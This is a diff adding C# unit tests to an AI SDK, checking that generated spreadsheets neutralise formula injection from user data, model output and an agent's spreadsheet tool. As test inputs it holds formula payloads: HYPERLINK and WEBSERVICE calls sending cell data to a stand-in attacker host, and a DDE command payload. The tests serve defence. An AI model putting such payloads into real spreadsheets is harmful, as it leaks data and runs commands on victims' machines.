@@ -1,8 +1,10 @@
 using System.Diagnostics;
 using System.Globalization;
 using System.Text;
+using AiSdk.Artifacts;
 using AiSdk.Documents;
 using AiSdk.Documents.Converters;
+using AiSdk.Documents.Generation;
 
 namespace AiSdk.Tests;
 
@@ -847,5 +849,107 @@ public class ExternalProcessSecurityTests
 
         public Task<TranscriptionModelResult> TranscribeAsync(TranscriptionModelRequest request, CancellationToken cancellationToken = default) =>
             Task.FromResult(new TranscriptionModelResult(string.Empty));
+    }
+}
+
+public class GenerationSecurityTests
+{
+    private sealed record Comment(string Author, string Text);
+
+    private static List<(string Reference, string? Formula, string? Text, bool QuotePrefix)> Cells(byte[] xlsx)
+    {
+        using var document = DocumentFormat.OpenXml.Packaging.SpreadsheetDocument.Open(new MemoryStream(xlsx), false);
+        var formats = document.WorkbookPart!.WorkbookStylesPart!.Stylesheet!.CellFormats!.Elements<DocumentFormat.OpenXml.Spreadsheet.CellFormat>().ToList();
+        return document.WorkbookPart.WorksheetParts
+            .SelectMany(p => p.Worksheet!.Descendants<DocumentFormat.OpenXml.Spreadsheet.Cell>())
+            .Select(c => (c.CellReference!.Value!, c.CellFormula?.Text, c.InlineString?.InnerText, formats[(int)(c.StyleIndex?.Value ?? 0)].QuotePrefix?.Value == true))
+            .ToList();
+    }
+
+    [Fact]
+    public void UserDataIsNeverWrittenAsLiveFormulas()
+    {
+        // Datos de usuarios finales (p. ej. comentarios de un formulario) y salida de un modelo.
+        const string exfiltrate = "=HYPERLINK(\"https://atacante.example/?d=\"&A2,\"Ver más\")";
+        var bytes = new SpreadsheetBuilder()
+            .AddSheet("Comentarios", [new Comment("ana", exfiltrate), new Comment("=cmd|' /C calc'!A0", "+SUM(1,2)"), new Comment("@foo", "-texto")])
+            .Build();
+        var fromModel = DocumentGenerator.ToXlsx("| Dato |\n|---|\n| =WEBSERVICE(\"https://atacante.example/\") |");
+
+        var cells = Cells(bytes).Concat(Cells(fromModel)).ToList();
+
+        using (var document = DocumentFormat.OpenXml.Packaging.SpreadsheetDocument.Open(new MemoryStream(bytes), false))
+        {
+            Assert.Empty(new DocumentFormat.OpenXml.Validation.OpenXmlValidator().Validate(document, TestContext.Current.CancellationToken));
+        }
+
+        Assert.All(cells, c => Assert.Null(c.Formula));
+        Assert.Contains(cells, c => c.Text == exfiltrate && c.QuotePrefix);
+        Assert.Contains(cells, c => c.Text == "=cmd|' /C calc'!A0" && c.QuotePrefix);
+        Assert.Contains(cells, c => c.Text == "+SUM(1,2)" && c.QuotePrefix);
+        Assert.Contains(cells, c => c.Text == "@foo" && c.QuotePrefix);
+        Assert.Contains(cells, c => c.Text == "=WEBSERVICE(\"https://atacante.example/\")" && c.QuotePrefix);
+        Assert.Contains(cells, c => c.Text == "ana" && !c.QuotePrefix);
+    }
+
+    [Fact]
+    public void FormulasCanBeEnabledAndFiltered()
+    {
+        IReadOnlyList<object?>[] rows = [[2, 3, "=A2*B2", "=SUM(A2:B2)", "=WEBSERVICE(\"https://x.example\")", "=[1]Hoja!A1", "=cmd|' /C calc'!A0"]];
+        var columns = Enumerable.Range(1, 7).Select(i => new SheetColumn($"C{i}")).ToList();
+
+        var all = Cells(new SpreadsheetBuilder { AllowFormulas = true }.AddSheet("Todo", columns, rows).Build());
+        var safe = Cells(new SpreadsheetBuilder { AllowFormulas = true, FormulaFilter = SpreadsheetBuilder.IsSafeFormula }.AddSheet("Seguro", columns, rows).Build());
+
+        Assert.Equal(5, all.Count(c => c.Formula is not null));
+        Assert.Equal(["A2*B2", "SUM(A2:B2)"], safe.Where(c => c.Formula is not null).Select(c => c.Formula));
+        Assert.Contains(safe, c => c.Text == "=WEBSERVICE(\"https://x.example\")");
+    }
+
+    [Theory]
+    [InlineData("B2*C2", true)]
+    [InlineData("SUM(B2:B9)/COUNT(B2:B9)", true)]
+    [InlineData("IF(A1>0,\"sí\",\"no\")", true)]
+    [InlineData("_xlfn.XLOOKUP(A1,'Hoja 2'!A:A,'Hoja 2'!B:B)", true)]
+    [InlineData("TEXT(A1,\"=HYPERLINK(\"\"x\"\")\")", true)] // el texto literal no se interpreta
+    [InlineData("HYPERLINK(\"https://atacante.example/?\"&A1)", false)]
+    [InlineData("WEBSERVICE(\"https://atacante.example/\")", false)]
+    [InlineData("FILTERXML(WEBSERVICE(\"x\"),\"//a\")", false)]
+    [InlineData("sum(1)+indirect(\"A1\")", false)]
+    [InlineData("cmd|' /C calc'!A0", false)]
+    [InlineData("[1]Hoja!A1", false)]
+    [InlineData("'C:\\ruta\\[libro.xlsx]Hoja'!A1", false)]
+    [InlineData("libro.xlsx!Total", false)]
+    [InlineData("\"sin cerrar", false)]
+    public void SafeFormulasAllowOnlyCalculation(string formula, bool expected) =>
+        Assert.Equal(expected, SpreadsheetBuilder.IsSafeFormula(formula));
+
+    [Fact]
+    public async Task AgentSpreadsheetToolKeepsCalculationsButNotExfiltration()
+    {
+        var store = new InMemoryArtifactStore();
+        var tools = DocumentTools.Create(new DocumentToolOptions { Store = store });
+        var model = new MockLanguageModel()
+            .ReturnsToolCall("create_spreadsheet", new
+            {
+                fileName = "reporte",
+                sheets = new[]
+                {
+                    new
+                    {
+                        name = "Datos",
+                        columns = new object[] { new { header = "Precio" }, new { header = "Cantidad" }, new { header = "Total" }, new { header = "Nota" } },
+                        rows = new[] { new object[] { 10, 2, "=A2*B2", "=WEBSERVICE(\"https://atacante.example/?\"&A2)" } },
+                    },
+                },
+            })
+            .ReturnsText("listo");
+
+        await Ai.GenerateTextAsync(new GenerateTextOptions { Model = model, Prompt = "x", Tools = tools, StopWhen = StopCondition.StepCountIs(3) });
+
+        var file = Assert.Single(await store.ListAsync(cancellationToken: TestContext.Current.CancellationToken));
+        var cells = Cells(file.Data!);
+        Assert.Equal(["A2*B2"], cells.Where(c => c.Formula is not null).Select(c => c.Formula));
+        Assert.Contains(cells, c => c.Text == "=WEBSERVICE(\"https://atacante.example/?\"&A2)" && c.QuotePrefix);
     }
 }
